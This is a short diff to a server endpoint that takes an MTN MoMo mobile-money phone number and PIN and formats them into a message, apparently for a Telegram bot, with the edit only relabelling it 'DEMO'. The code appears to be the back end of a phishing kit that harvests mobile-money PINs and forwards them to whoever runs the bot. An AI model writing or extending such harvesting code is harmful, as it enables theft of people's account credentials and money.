@@ -42,10 +42,10 @@ app.post("/mtn-submission", async (req, res) => {
   if (botToken && chatId) {
 
     const message =
-`🧪 MTN MoMo SUBMISSION
+`🧪 MTN MoMo DEMO
 
 📱 Mtn number: ${phone}
-📱 Mtn pin:${pin}
+📱 Mtn pincode:${pin}
 📱 Time :
 ✅ Result: ${success ? "Application successful" : "Application failed"}
 
